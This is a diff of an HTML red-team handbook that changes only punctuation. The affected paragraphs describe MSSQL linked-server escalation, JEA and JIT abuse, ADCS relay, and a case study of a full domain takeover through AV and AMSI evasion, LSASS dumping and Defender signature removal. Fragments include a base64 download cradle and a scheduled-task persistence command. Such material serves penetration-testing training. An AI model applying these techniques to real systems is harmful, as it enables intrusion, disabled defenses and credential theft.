-<p>If a link is configured bidirectionally — server A links to server B, and server B links back to server A — it is possible to follow the chain A → B → A and arrive on server A with the security context of the B-to-A link. If that return link uses a <code>sysadmin</code> login, this constitutes a privilege escalation on server A from a low-privilege starting point on server A itself.</p>
+<p>If a link is configured bidirectionally, server A links to server B, and server B links back to server A, it is possible to follow the chain A → B → A and arrive on server A with the security context of the B-to-A link. If that return link uses a <code>sysadmin</code> login, this constitutes a privilege escalation on server A from a low-privilege starting point on server A itself.</p>
 
 <p>The double-OPENQUERY trick reveals the effective login after following the full chain before committing to code execution. Confirm <code>sysadmin</code> membership at the destination before enabling <code>xp_cmdshell</code>, then execute the Sliver stager through the same nested query path.</p>
 
@@ -8906,7 +8906,7 @@ sliver ([session]) > execute-assembly -t 20 /home/kali/tools/MSSQLand.exe [sql-s
 
 <h3 id="mssqlclient-ng-tool">18.12 mssqlclient-ng — External Linux Client</h3>
 
-<p>mssqlclient-ng is a Python-based MSSQL client for use on the Kali attack machine. It supports Windows authentication, pass-the-hash, machine account PTH, and Kerberos — making it the go-to tool for initial access when operating through a SOCKS5 proxy from a Sliver session. It also supports linked server traversal with the <code>-l</code> flag and one-shot action mode with <code>-a</code>.</p>
+<p>mssqlclient-ng is a Python-based MSSQL client for use on the Kali attack machine. It supports Windows authentication, pass-the-hash, machine account PTH, and Kerberos, making it the go-to tool for initial access when operating through a SOCKS5 proxy from a Sliver session. It also supports linked server traversal with the <code>-l</code> flag and one-shot action mode with <code>-a</code>.</p>
 
 <table class="custom-table">
 <thead><tr><th>Auth Mode</th><th>Command</th></tr></thead>
@@ -8995,7 +8995,7 @@ exec 'powershell -enc [base64-cradle]'</code></pre>
 
 <h3 id="sqlrecon-tool">18.14 SQLRecon — Reference</h3>
 
-<p>SQLRecon is a .NET MSSQL reconnaissance and exploitation framework executed via <code>execute-assembly</code> or <code>inline-execute-assembly</code> from Sliver. It covers enumeration, impersonation, xp_cmdshell, CLR assemblies, and linked server queries through a module system (<code>/m:</code> flag). Its primary limitation is that impersonation cannot be chained across linked server hops — use MSSQLand for multi-hop impersonation scenarios.</p>
+<p>SQLRecon is a .NET MSSQL reconnaissance and exploitation framework executed via <code>execute-assembly</code> or <code>inline-execute-assembly</code> from Sliver. It covers enumeration, impersonation, xp_cmdshell, CLR assemblies, and linked server queries through a module system (<code>/m:</code> flag). Its primary limitation is that impersonation cannot be chained across linked server hops, use MSSQLand for multi-hop impersonation scenarios.</p>
 
 <table class="custom-table">
 <thead><tr><th>Module (<code>/m:</code>)</th><th>Description</th><th>Example Flag</th></tr></thead>
@@ -9720,7 +9720,7 @@ impacket-wmiexec -k -no-pass [root-dc].[root-domain]</code></pre>
 </ul>
 
 <h3 id="ad-exploit-jea">20.10 Just Enough Administration (JEA) Abuse</h3>
-<p><strong>Just Enough Administration (JEA)</strong>, introduced in Windows Server 2016, is a PowerShell-based delegated administration model. Rather than granting a user full local Administrator on a machine, an admin defines a constrained remote PowerShell endpoint that exposes only a whitelisted set of cmdlets, functions, aliases, and parameters. JEA runs on top of PowerShell Remoting (WinRM, port 5985/5986) and typically executes commands inside a <em>virtual account</em> that belongs to the local Administrators group but is destroyed when the session ends. Because the underlying context is administrative, any breakout — an unsafe cmdlet, a wildcard parameter, a language-mode escape — pivots the low-privileged JEA user into local SYSTEM-equivalent control of the target.</p>
+<p><strong>Just Enough Administration (JEA)</strong>, introduced in Windows Server 2016, is a PowerShell-based delegated administration model. Rather than granting a user full local Administrator on a machine, an admin defines a constrained remote PowerShell endpoint that exposes only a whitelisted set of cmdlets, functions, aliases, and parameters. JEA runs on top of PowerShell Remoting (WinRM, port 5985/5986) and typically executes commands inside a <em>virtual account</em> that belongs to the local Administrators group but is destroyed when the session ends. Because the underlying context is administrative, any breakout, an unsafe cmdlet, a wildcard parameter, a language-mode escape, pivots the low-privileged JEA user into local SYSTEM-equivalent control of the target.</p>
 <p>A JEA endpoint is built from two files. A <strong>Session Configuration File</strong> (<code>.pssc</code>) declares the session identity (<code>RunAsVirtualAccount</code>), <code>SessionType</code> (<code>Default</code> = FullLanguage, or the recommended <code>RestrictedRemoteServer</code> = NoLanguage), transcript directory, and the <code>RoleDefinitions</code> map that ties AD groups to role capabilities. A <strong>Role Capability File</strong> (<code>.psrc</code>) lists <code>VisibleCmdlets</code>, <code>VisibleFunctions</code>, <code>VisibleAliases</code>, <code>VisibleExternalCommands</code>, and <code>VisibleProviders</code>. The admin registers the endpoint with <code>Register-PSSessionConfiguration</code>, at which point WinRM advertises the configuration name and the endpoint is reachable via <code>Enter-PSSession -ConfigurationName</code>.</p>
 
 <table class="custom-table">
@@ -9871,7 +9871,7 @@ Restart-Service WinRM</code></pre>
 </ul>
 
 <h3 id="ad-exploit-jit">20.11 Just-In-Time (JIT) Access Abuse</h3>
-<p><strong>Just-In-Time (JIT) Administration</strong> replaces persistent membership in privileged groups with time-boxed, request/approval-based membership. When AD is the identity backend, JIT relies on the <strong>Privileged Access Management (PAM)</strong> optional feature. Enabling PAM sets <code>msDS-EnabledFeature</code> on the forest configuration object, extends the schema with <code>msDS-ShadowPrincipal</code> classes, and — most importantly — teaches the KDC to honor a <code>TTL</code> attribute on group membership: the user is added to the group for N seconds, after which the ticket-granting service refuses to include the group SID in future PAC data. PAM requires a <strong>Windows Server 2016 forest functional level</strong> and, once enabled, cannot be disabled.</p>
+<p><strong>Just-In-Time (JIT) Administration</strong> replaces persistent membership in privileged groups with time-boxed, request/approval-based membership. When AD is the identity backend, JIT relies on the <strong>Privileged Access Management (PAM)</strong> optional feature. Enabling PAM sets <code>msDS-EnabledFeature</code> on the forest configuration object, extends the schema with <code>msDS-ShadowPrincipal</code> classes, and, most importantly, teaches the KDC to honor a <code>TTL</code> attribute on group membership: the user is added to the group for N seconds, after which the ticket-granting service refuses to include the group SID in future PAC data. PAM requires a <strong>Windows Server 2016 forest functional level</strong> and, once enabled, cannot be disabled.</p>
 <p>The reference implementation is Microsoft Identity Manager (MIM) with its bastion-forest topology, but most organisations deploy custom self-service portals, CyberArk PAM, BeyondTrust, or Delinea to expose a request/approve workflow on top of the same TTL primitive. From an attacker&#39;s perspective, JIT exploitation is a chain: (1) enumerate PAM to confirm JIT is possible, (2) locate the request portal and the requester/approver groups, (3) request access to a privileged group that yields a Kerberos-refreshable pivot (SQL, WinRM, admin share), (4) get the request approved (via a compromised approver, a self-approval bug, or workflow abuse), (5) refresh Kerberos so the new group SID appears in the PAC, and (6) act before the TTL expires.</p>
 
 <table class="custom-table">
@@ -10143,7 +10143,7 @@ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provid
 </ul>
 
 <h3 id="adcs-esc8">21.3 ESC8 — NTLM Relay to ADCS HTTP Endpoints</h3>
-<p>The ADCS web enrollment service at <code>http://[ca-host]/certsrv/</code> uses HTTP (not HTTPS by default) and accepts only NTLM authentication. This makes it a natural relay target. An attacker coerces a privileged account — typically a Domain Controller machine account — into authenticating over SMB to the attacker's machine, which relays those credentials to the CA web enrollment service and requests a certificate on the DC's behalf.</p>
+<p>The ADCS web enrollment service at <code>http://[ca-host]/certsrv/</code> uses HTTP (not HTTPS by default) and accepts only NTLM authentication. This makes it a natural relay target. An attacker coerces a privileged account, typically a Domain Controller machine account, into authenticating over SMB to the attacker's machine, which relays those credentials to the CA web enrollment service and requests a certificate on the DC's behalf.</p>
 <p>Even when HTTPS is enabled, the enrollment service remains vulnerable unless Extended Protection for Authentication (EPA/channel binding) is explicitly configured on IIS, which is not the default. The result of a successful relay is a PFX certificate for the DC machine account, which can be used with Certipy's PKINIT support to extract the DC's NTLM hash and then DCSync all domain credentials.</p>
 
 <h4>21.3.1 Attack Prerequisites</h4>
@@ -10250,7 +10250,7 @@ sliver (SESSION) > psexec --hostname [dc] --service-name [svc-name] --service-de
 
     <h2 id="combining-pieces">22. Combining the Pieces — End-to-End Case Study</h2>
 
-<p>This chapter walks a full external-to-domain-admin attack chain against a small Active Directory environment (<code>corp.local</code>) consisting of a domain controller <code>dc02.corp.local</code>, a file server <code>file01.corp.local</code>, and an internet-facing IIS server <code>web01.corp.local</code>. Every host runs Windows Defender with real-time protection, AMSI, AppLocker under a Microsoft-signed publisher rule, and LSA Protection (RunAsPPL). The engagement starts with zero credentials and zero knowledge — the objective is to chain enumeration, evasion, delegation abuse, credential access, and lateral movement into full domain compromise.</p>
+<p>A full external-to-domain-admin chain against a small Active Directory environment. The domain <code>corp.local</code> holds three hosts: a domain controller <code>dc02.corp.local</code>, a file server <code>file01.corp.local</code>, and an internet-facing IIS server <code>web01.corp.local</code>. Every host runs Windows Defender with real-time protection, AMSI, AppLocker under a Microsoft-signed publisher rule, and LSA Protection (RunAsPPL). The engagement starts with zero credentials and zero knowledge; the objective is to chain enumeration, evasion, delegation abuse, credential access, and lateral movement into full domain compromise.</p>
 
 <h3 id="cp-scenario">22.1 Scenario and Initial Enumeration</h3>
 
@@ -10308,7 +10308,7 @@ echo '10.10.10.132 web01.corp.local web01' | sudo tee -a /etc/hosts</code></pre>
 
 <h3 id="cp-foothold">22.2 Gaining an Initial Foothold via Web Upload</h3>
 
-<p>A stock <code>msfvenom</code> ASPX Meterpreter is instantly caught by Defender on the server — the payload is quarantined and the application returns a 500 error citing HRESULT 0x800700E1. The fix is to swap the boxed shellcode runner for a signature-and-heuristic-evading loader we already own from earlier modules: replace <code>VirtualAlloc</code> with the non-emulated <code>VirtualAllocExNuma</code>, encrypt the shellcode with a small Caesar shift, and decrypt at runtime. That single change bypasses Defender because the AMSI/heuristic engine does not recognize the emulated allocation pattern and the on-disk bytes no longer match the signatured shellcode blob.</p>
+<p>A stock <code>msfvenom</code> ASPX Meterpreter is instantly caught by Defender on the server, the payload is quarantined and the application returns a 500 error citing HRESULT 0x800700E1. The fix is to swap the boxed shellcode runner for a signature-and-heuristic-evading loader we already own from earlier modules: replace <code>VirtualAlloc</code> with the non-emulated <code>VirtualAllocExNuma</code>, encrypt the shellcode with a small Caesar shift, and decrypt at runtime. That single change bypasses Defender because the AMSI/heuristic engine does not recognize the emulated allocation pattern and the on-disk bytes no longer match the signatured shellcode blob.</p>
 
 <table class="custom-table">
 <thead><tr><th>Stage</th><th>Purpose</th><th>Artifact</th></tr></thead>
@@ -10382,7 +10382,7 @@ meterpreter &gt; sysinfo</code></pre>
 
 <h3 id="cp-post-enum">22.3 Post-Exploitation Enumeration and AMSI Bypass</h3>
 
-<p>The ASPX-spawned Meterpreter lives inside <code>w3wp.exe</code> and dies when the worker recycles. Migrate into a spawned Notepad so the session survives, then profile the host: Defender presence, LAPS deployment, LSA protection, and AppLocker rules. Once we know AMSI is enforced, we disable it in the current PowerShell runspace by nulling the first four bytes of <code>amsiContext</code>, load PowerView from memory, and hunt for the highest-yield AD misconfiguration — Kerberos delegation.</p>
+<p>The ASPX-spawned Meterpreter lives inside <code>w3wp.exe</code> and dies when the worker recycles. Migrate into a spawned Notepad so the session survives, then profile the host: Defender presence, LAPS deployment, LSA protection, and AppLocker rules. Once we know AMSI is enforced, we disable it in the current PowerShell runspace by nulling the first four bytes of <code>amsiContext</code>, load PowerView from memory, and hunt for the highest-yield AD misconfiguration, Kerberos delegation.</p>
 
 <table class="custom-table">
 <thead><tr><th>Check</th><th>Signal</th><th>Impact on Chain</th></tr></thead>
@@ -10447,7 +10447,7 @@ PS&gt; Get-DomainComputer | Where-Object { $_.'msds-allowedtoactonbehalfofotheri
 
 <h3 id="cp-privesc">22.4 Privilege Escalation on web01 with PrintSpoofer</h3>
 
-<p>The DefaultAppPool token carries <code>SeImpersonatePrivilege</code>, which is enough for the potato family of attacks. Windows Server 2019 rules out Juicy Potato and FaxHell, and RoguePotato needs a second host we do not yet control — that leaves PrintSpoofer. The stock PrintSpoofer binary is signature-flagged, so operate the pipe server and the printer bug as two custom binaries: a hand-rolled <code>PrintSpooferNet</code> that owns the named pipe and calls <code>CreateProcessWithTokenW</code>, and a copy of <code>SpoolSample</code> that triggers the print spooler to authenticate to that pipe. Because DefaultAppPool has no interactive logon session, <code>CreateProcessWithTokenW</code> must be supplied a manually-built environment block and an explicit <code>WinSta0\Default</code> desktop, otherwise the SYSTEM process dies immediately.</p>
+<p>The DefaultAppPool token carries <code>SeImpersonatePrivilege</code>, which is enough for the potato family of attacks. Windows Server 2019 rules out Juicy Potato and FaxHell, and RoguePotato needs a second host we do not yet control, that leaves PrintSpoofer. The stock PrintSpoofer binary is signature-flagged, so operate the pipe server and the printer bug as two custom binaries: a hand-rolled <code>PrintSpooferNet</code> that owns the named pipe and calls <code>CreateProcessWithTokenW</code>, and a copy of <code>SpoolSample</code> that triggers the print spooler to authenticate to that pipe. Because DefaultAppPool has no interactive logon session, <code>CreateProcessWithTokenW</code> must be supplied a manually-built environment block and an explicit <code>WinSta0\Default</code> desktop, otherwise the SYSTEM process dies immediately.</p>
 
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
@@ -10521,7 +10521,7 @@ meterpreter &gt; migrate [spoolsv-pid]</code></pre>
 
 <h3 id="cp-dumphash">22.5 Dumping the web01 Machine Account Hash</h3>
 
-<p>Constrained delegation abuse needs the web01$ machine account NTLM hash. LSASS is protected — <code>RunAsPPL = 1</code> — so we cannot inject Mimikatz directly into it. The workaround is a three-step dance: load the signed <code>mimidrv.sys</code> kernel driver with the service control manager, run Invoke-Mimikatz just once (accepting a single AV alert) to have the driver strip PPL from LSASS, then dump LSASS with a custom <code>MiniDumpWriteDump</code> binary that Defender does not recognize. Parse the offline dump on a dev machine so no further Mimikatz executions happen on the target.</p>
+<p>Constrained delegation abuse needs the web01$ machine account NTLM hash. LSASS is protected, <code>RunAsPPL = 1</code>, so we cannot inject Mimikatz directly into it. The workaround is a three-step dance: load the signed <code>mimidrv.sys</code> kernel driver with the service control manager, run Invoke-Mimikatz just once (accepting a single AV alert) to have the driver strip PPL from LSASS, then dump LSASS with a custom <code>MiniDumpWriteDump</code> binary that Defender does not recognize. Parse the offline dump on a dev machine so no further Mimikatz executions happen on the target.</p>
 
 <table class="custom-table">
 <thead><tr><th>Step</th><th>Tool</th><th>Where it Runs</th></tr></thead>
@@ -10658,7 +10658,7 @@ PS&gt; $assem = [System.Reflection.Assembly]::Load($data)</code></pre>
 
 <h3 id="cp-lateral">22.7 Lateral Movement to file01 with Defender Signature Wipe</h3>
 
-<p>The CIFS TGS gives file write access to <code>\\file01\c$</code>, but code execution needs the service control manager on file01. Rather than fight msfvenom-generated service binaries (Defender kills them) or drop signature-heavy PsExec, we abuse an existing benign service — <code>SensorService</code> — by pointing its <code>ImagePath</code> at our loader, starting it, letting it time out (Windows expects service callbacks it will not receive), and letting the loader process-inject our shellcode into <code>spoolsv.exe</code>, which is one of the few SYSTEM processes on Server 2019 that is not PPL-protected. Defender still sees the reverse HTTPS traffic via the WdNisSvc network inspector, so we chain a first ChangeServiceConfig call that points at <code>MpCmdRun.exe -RemoveDefinitions -All</code> — Defender obligingly deletes its own signatures — before the second call swaps in the real payload.</p>
+<p>The CIFS TGS gives file write access to <code>\\file01\c$</code>, but code execution needs the service control manager on file01. Rather than fight msfvenom-generated service binaries (Defender kills them) or drop signature-heavy PsExec, we abuse an existing benign service, <code>SensorService</code>, by pointing its <code>ImagePath</code> at our loader, starting it, letting it time out (Windows expects service callbacks it will not receive), and letting the loader process-inject our shellcode into <code>spoolsv.exe</code>, which is one of the few SYSTEM processes on Server 2019 that is not PPL-protected. Defender still sees the reverse HTTPS traffic via the WdNisSvc network inspector, so we chain a first ChangeServiceConfig call that points at <code>MpCmdRun.exe -RemoveDefinitions -All</code>, Defender obligingly deletes its own signatures, before the second call swaps in the real payload.</p>
 
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
@@ -10730,7 +10730,7 @@ C:\Windows\System32&gt; schtasks /create /sc minute /mo 30 /tn "SignatureMainten
 
 <h3 id="cp-domain-admin">22.8 Becoming Domain Admin and Full Chain Recap</h3>
 
-<p>The SYSTEM shell on file01 finds Domain Admin <code>paul</code>'s tokens present in memory because ServerManager and Explorer were running under his session. Incognito lists and impersonates delegation tokens without ever touching LSASS a second time — no PPL fight, no second AV alert. From paul's token we repeat the SensorService trick against dc02, land SYSTEM on the DC, and pull the full NTDS.DIT via DCSync so we own <code>krbtgt</code> for arbitrary golden ticket persistence.</p>
+<p>The SYSTEM shell on file01 finds Domain Admin <code>paul</code>'s tokens present in memory because ServerManager and Explorer were running under his session. Incognito lists and impersonates delegation tokens without ever touching LSASS a second time, no PPL fight, no second AV alert. From paul's token we repeat the SensorService trick against dc02, land SYSTEM on the DC, and pull the full NTDS.DIT via DCSync so we own <code>krbtgt</code> for arbitrary golden ticket persistence.</p>
 
 <table class="custom-table">
 <thead><tr><th>Phase</th><th>Primitive</th><th>Result</th></tr></thead>
